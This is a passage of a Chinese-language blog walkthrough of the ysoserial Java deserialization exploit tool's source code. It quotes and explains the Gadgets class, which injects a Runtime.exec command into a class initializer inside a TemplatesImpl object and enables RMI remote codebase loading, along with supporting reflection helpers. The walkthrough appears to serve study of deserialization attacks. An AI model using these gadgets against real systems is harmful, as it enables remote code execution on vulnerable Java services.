<h3 id="注解属性解析"><a href="#注解属性解析" class="headerlink" title="注解属性解析"></a>注解属性解析</h3><ol>
<li><strong><code>@Retention(RetentionPolicy.RUNTIME)</code></strong>:</li>
</ol>
<ul>
<li>这个注解的保留策略是 <code>RUNTIME</code>，意味着该注解在运行时可以通过反射机制读取。</li>
</ul>
<ol start="2">
<li><strong><code>String skip() default &quot;&quot;</code></strong>:</li>
</ol>
<ul>
<li>定义了一个名为 <code>skip</code> 的属性，类型为 <code>String</code>，默认值为空字符串。这个属性可能用于标记某个测试是否应该被跳过。</li>
</ul>
<ol start="3">
<li><strong><code>String precondition() default &quot;&quot;</code></strong>:</li>
</ol>
<ul>
<li>定义了一个名为 <code>precondition</code> 的属性，类型为 <code>String</code>，默认值为空字符串。这个属性可能用于指定测试执行前的先决条件。</li>
</ul>
<ol start="4">
<li><strong><code>String harness() default &quot;&quot;</code></strong>:</li>
</ol>
<ul>
<li>定义了一个名为 <code>harness</code> 的属性，类型为 <code>String</code>，默认值为空字符串。这个属性可能用于指定测试执行的环境或框架。</li>
</ul>
<ol start="5">
<li><strong><code>String flaky() default &quot;&quot;</code></strong>:</li>
</ol>
<ul>
<li>定义了一个名为 <code>flaky</code> 的属性，类型为 <code>String</code>，默认值为空字符串。这个属性可能用于标记某个测试是否是不稳定的（即可能会随机失败）。</li>
</ul>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><p>假设我们有一个测试类 <code>MyTest</code>，我们可以使用 <code>@PayloadTest</code> 注解来标记测试的相关信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">@PayloadTest(</span></span><br><span class="line"><span class="meta"> skip = &quot;This test is currently broken and needs to be fixed.&quot;,</span></span><br><span class="line"><span class="meta"> precondition = &quot;Ensure the database is running before executing this test.&quot;,</span></span><br><span class="line"><span class="meta"> harness = &quot;JUnit&quot;,</span></span><br><span class="line"><span class="meta"> flaky = &quot;This test sometimes fails due to network issues.&quot;</span></span><br><span class="line"><span class="meta">&gt;)</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line"> <span class="comment">// Test methods go here</span></span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h4 id="Utils包"><a href="#Utils包" class="headerlink" title="Utils包"></a>Utils包</h4><p>Utils中主要利用反射生成对应类</p>
<h5 id="ClassFiles类"><a href="#ClassFiles类" class="headerlink" title="ClassFiles类"></a>ClassFiles类</h5><p>这段代码定义了一个名为 <code>ClassFiles</code> 的工具类，其中包含了一些用于处理 Java 类文件的静态方法。下面是对这些方法的详细解析：</p>
<h6 id="1-classAsFile方法"><a href="#1-classAsFile方法" class="headerlink" title="1. classAsFile方法"></a>1. <code>classAsFile</code>方法</h6><p>这个方法将一个 <code>Class</code> 对象转换为对应的类文件路径字符串。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> classAsFile(clazz, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="type">boolean</span> suffix)</span> &#123;</span><br><span class="line">    String str;</span><br><span class="line">    <span class="keyword">if</span> (clazz.getEnclosingClass() == <span class="literal">null</span>) &#123;</span><br><span class="line">        str = clazz.getName().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        str = classAsFile(clazz.getEnclosingClass(), <span class="literal">false</span>) + <span class="string">&quot;$&quot;</span> + clazz.getSimpleName();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">        str += <span class="string">&quot;.class&quot;</span>;            </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法解析</p>
<ul>
<li><strong><code>classAsFile(Class&lt;?&gt; clazz)</code></strong>: 这是一个重载方法，调用了 <code>classAsFile(Class&lt;?&gt; clazz, boolean suffix)</code> 并将 <code>suffix</code> 参数设为 <code>true</code>。</li>
<li><strong><code>classAsFile(Class&lt;?&gt; clazz, boolean suffix)</code></strong>:<ul>
<li><code>clazz.getEnclosingClass() == null</code>: 判断当前类是否是一个内部类。如果不是内部类，则将类名中的<code>.</code>替换为<code>/</code>，形成类文件的路径格式。</li>
<li>如果是内部类，则递归调用 <code>classAsFile</code> 方法获取外部类的路径，并在其后加上<code>$</code>和当前内部类的简单名称。</li>
<li><code>suffix</code> 参数决定是否在字符串的末尾加上<code>.class</code>后缀。</li>
</ul>
</li>
</ul>
<p>示例</p>
<p>假设有一个类 <code>com.example.MyClass</code> 和一个内部类 <code>com.example.MyClass$InnerClass</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(ClassFiles.classAsFile(MyClass.class));</span><br><span class="line"><span class="comment">// 输出: com/example/MyClass.class</span></span><br><span class="line"></span><br><span class="line">System.out.println(ClassFiles.classAsFile(MyClass.InnerClass.class));</span><br><span class="line"><span class="comment">// 输出: com/example/MyClass$InnerClass.class</span></span><br></pre></td></tr></table></figure>

<h6 id="2-classAsBytes-方法"><a href="#2-classAsBytes-方法" class="headerlink" title="2. classAsBytes 方法"></a>2. <code>classAsBytes</code> 方法</h6><p>这个方法将一个 <code>Class</code> 对象转换为对应的类文件的字节数组。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> classAsFile(clazz);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> ClassFiles.class.getClassLoader().getResourceAsStream(file);</span><br><span class="line">        <span class="keyword">if</span> (in == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;couldn&#x27;t find &#x27;&quot;</span> + file + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法解析</p>
<ul>
<li><strong><code>classAsBytes(Class&lt;?&gt; clazz)</code></strong>:<ul>
<li>调用 <code>classAsFile(clazz)</code> 获取类文件的路径。</li>
<li>使用 <code>ClassLoader</code> 的 <code>getResourceAsStream(file)</code> 方法获取类文件的输入流。</li>
<li>如果找不到类文件，抛出 <code>IOException</code>。</li>
<li>使用一个 <code>ByteArrayOutputStream</code> 将输入流的数据读入一个字节数组，并返回这个字节数组。</li>
</ul>
</li>
</ul>
<p>示例</p>
<p>假设有一个类 <code>com.example.MyClass</code>，我们可以获取它的字节码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] classData = ClassFiles.classAsBytes(MyClass.class);</span><br><span class="line">System.out.println(Arrays.toString(classData));</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><code>ClassFiles</code> 工具类提供了两种主要功能：</p>
<ol>
<li>将 <code>Class</code> 对象转换为类文件的路径字符串。</li>
<li>将 <code>Class</code> 对象转换为类文件的字节数组。</li>
</ol>
<p>这些方法在需要处理类文件的场景下非常有用，比如动态类加载、类文件分析等。</p>
<h5 id="Gadgets类"><a href="#Gadgets类" class="headerlink" title="Gadgets类"></a>Gadgets类</h5><p>这段代码是 ysoserial 工具中的一个实用类 <code>Gadgets</code>，它包含了一系列用于生成反序列化 payload 的辅助方法。以下是对各个部分的详细解析：</p>
<h6 id="静态初始化块"><a href="#静态初始化块" class="headerlink" title="静态初始化块"></a>静态初始化块</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// special case for using TemplatesImpl gadgets with a SecurityManager enabled</span></span><br><span class="line">    System.setProperty(DESERIALIZE_TRANSLET, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for RMI remote loading</span></span><br><span class="line">    System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在静态初始化块中，设置了两个系统属性：</p>
<ol>
<li><code>DESERIALIZE_TRANSLET</code> 设置为 <code>&quot;true&quot;</code>，用于在启用 <code>SecurityManager</code> 的情况下使用 <code>TemplatesImpl</code>  gadgets。</li>
<li><code>java.rmi.server.useCodebaseOnly</code> 设置为 <code>&quot;false&quot;</code>，用于 RMI 远程加载。</li>
</ol>
<h6 id="常量和内部类"><a href="#常量和内部类" class="headerlink" title="常量和内部类"></a>常量和内部类</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANN_INV_HANDLER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Foo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ANN_INV_HANDLER_CLASS</code> 是一个常量，表示 <code>AnnotationInvocationHandler</code> 类的全限定名。</li>
<li><code>StubTransletPayload</code> 是一个实现了 <code>AbstractTranslet</code> 和 <code>Serializable</code> 接口的内部类，用于生成 <code>TemplatesImpl</code> 的 payload。</li>
<li><code>Foo</code> 是一个简单的可序列化类，用于辅助生成 payload。</li>
</ul>
<h6 id="辅助方法"><a href="#辅助方法" class="headerlink" title="辅助方法"></a>辅助方法</h6><p><code>createMemoitizedProxy</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createMemoitizedProxy</span><span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法用于创建一个代理对象，该代理对象使用 <code>AnnotationInvocationHandler</code> 作为调用处理器。</p>
<p><code>createMemoizedInvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">createMemoizedInvocationHandler</span><span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法用于创建一个 <code>AnnotationInvocationHandler</code> 实例，并将其与一个 <code>Map</code> 对象关联。</p>
<p><code>createProxy</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createProxy</span><span class="params">(<span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[<span class="number">0</span>] = iface;</span><br><span class="line">    <span class="keyword">if</span> (ifaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码通过指定的 <code>InvocationHandler</code> 和接口，使用 Java 反射生成一个动态代理对象。它首先创建一个包含所有接口类型的数组，然后调用 <code>Proxy.newProxyInstance</code> 创建代理实例，并将其强制转换为第一个接口类型。该方法允许代理对象同时实现多个接口。</p>
<p><code>createMap</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">createMap</span><span class="params">(<span class="keyword">final</span> String key, <span class="keyword">final</span> Object val)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    map.put(key, val);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用给定的<code>key</code>和<code>value</code>创建一个<code>HashMap</code>，因为ysoserial在使用过程中需要频繁地创建<code>HashMap</code>所以将这个操作封装。</p>
<p><code>createTemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个方法通过检查系统属性 <code>properXalan</code> 来决定使用哪个 <code>TemplatesImpl</code> 类。如果 <code>properXalan</code> 设置为 <code>true</code>，则动态加载 <code>org.apache.xalan</code> 包下的类；否则，使用默认的 <code>TemplatesImpl</code>、<code>AbstractTranslet</code> 和 <code>TransformerFactoryImpl</code> 类。</p>
<p>然后调用重载的createTemolatesImpl来真正创建恶意 <code>TemplatesImpl</code> 对象。</p>
<p><code>createTemplatesImpl</code>（重载）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码通过 <code>javassist</code> 库动态生成一个包含恶意代码的类，并将其字节码注入到一个新的 <code>TemplatesImpl</code> 实例中。恶意代码在类加载时执行指定的系统命令。该方法利用反射设置必要的字段，使 <code>TemplatesImpl</code> 在反序列化时触发命令执行。</p>
<p><code>makeMap</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,</span><br><span class="line">        IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    Class nodeC;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">    Reflections.setAccessible(nodeCons);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">    Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">    Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码通过反射机制创建并初始化一个 <code>HashMap</code>，其中包含两个键值对。它首先设置 <code>HashMap</code> 的大小，然后根据JDK版本的不同动态获取 <code>HashMap$Node</code> 或 <code>HashMap$Entry</code> 类的构造器，并利用该构造器创建两个节点对象。接着，将这两个节点对象放入一个新创建的数组中，并将该数组设置为 <code>HashMap</code> 的内部表结构。最终返回这个定制的 <code>HashMap</code> 实例。</p>
<h5 id="JavaVersion类"><a href="#JavaVersion类" class="headerlink" title="JavaVersion类"></a>JavaVersion类</h5><p>检测Java版本</p>
<h5 id="PayloadRunner类"><a href="#PayloadRunner类" class="headerlink" title="PayloadRunner类"></a>PayloadRunner类</h5><p>测试payload，执行一次序列化和反序列化的过程，看能否达到预期的目的。</p>
<h5 id="Reflections类"><a href="#Reflections类" class="headerlink" title="Reflections类"></a>Reflections类</h5><p>这个类是将yso中经常使用的反射操作做一个封装来方便使用。</p>
<ol>
<li><code>setAccessible(AccessibleObject member)</code>：<ul>
<li>作用：根据当前 JDK 版本设置反射对象的可访问性。对 JDK 版本 12 之前，使用 <code>Permit</code> 工具类来静默设置；对 JDK 12 及之后，直接调用 <code>setAccessible(true)</code>，但可能会有警告。</li>
<li>参数：<code>AccessibleObject</code> 是 Java 反射 API 中的父类，包含 <code>Field</code>、<code>Method</code> 和 <code>Constructor</code>。</li>
</ul>
</li>
<li><code>getField(Class&lt;?&gt; clazz, String fieldName)</code>：<ul>
<li>作用：递归获取类及其父类中的指定字段，并设置其可访问性。</li>
<li>参数：<code>clazz</code> 要操作的类，<code>fieldName</code> 要获取的字段名称。</li>
<li>返回值：返回找到的字段。</li>
</ul>
</li>
<li><code>setFieldValue(Object obj, String fieldName, Object value)</code>：<ul>
<li>作用：设置给定对象 <code>obj</code> 中指定字段 <code>fieldName</code> 的值为 <code>value</code>。</li>
<li>参数：<code>obj</code> 要操作的对象，<code>fieldName</code> 字段名称，<code>value</code> 要设置的值。</li>
</ul>
</li>
<li><code>getFieldValue(Object obj, String fieldName)</code>：<ul>
<li>作用：获取给定对象 <code>obj</code> 中指定字段 <code>fieldName</code> 的值。</li>
<li>参数：<code>obj</code> 要操作的对象，<code>fieldName</code> 字段名称。</li>
<li>返回值：返回字段的当前值。</li>
</ul>
</li>
<li><code>getFirstCtor(String name)</code>：<ul>
<li>作用：获取指定类名的第一个构造函数，并设置其可访问性。</li>
<li>参数：<code>name</code> 类名（包括包名）。</li>
<li>返回值：返回第一个构造函数。</li>
</ul>
</li>
<li><code>newInstance(String className, Object ... args)</code>：<ul>
<li>作用：通过指定类名和构造函数参数创建类的新实例。</li>
<li>参数：<code>className</code> 类名（包括包名），<code>args</code> 构造函数参数。</li>
<li>返回值：返回创建的新实例。</li>
</ul>
</li>
<li><code>createWithoutConstructor(Class&lt;T&gt; classToInstantiate)</code>：<ul>
<li>作用：不调用构造函数实例化指定类（通过序列化机制）。</li>
<li>参数：<code>classToInstantiate</code> 要实例化的类。</li>
<li>返回值：返回新实例。</li>
</ul>
</li>
<li><code>createWithConstructor(Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</code>：<ul>
<li>作用：通过构造函数参数创建类的新实例（通过序列化机制）。</li>
<li>参数：<code>classToInstantiate</code> 要实例化的类，<code>constructorClass</code> 构造函数所在的类，<code>consArgTypes</code> 构造函数参数类型数组，<code>consArgs</code> 构造函数参数值数组。</li>
<li>返回值：返回新实例。</li>
</ul>
</li>
</ol>
<blockquote>
<p><code>ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons)</code> 用途是利用 Java 的反射机制通过序列化的方式为特定类创建一个构造函数，以便实例化对象，而无需调用该类的常规构造函数。具体解释如下：</p>
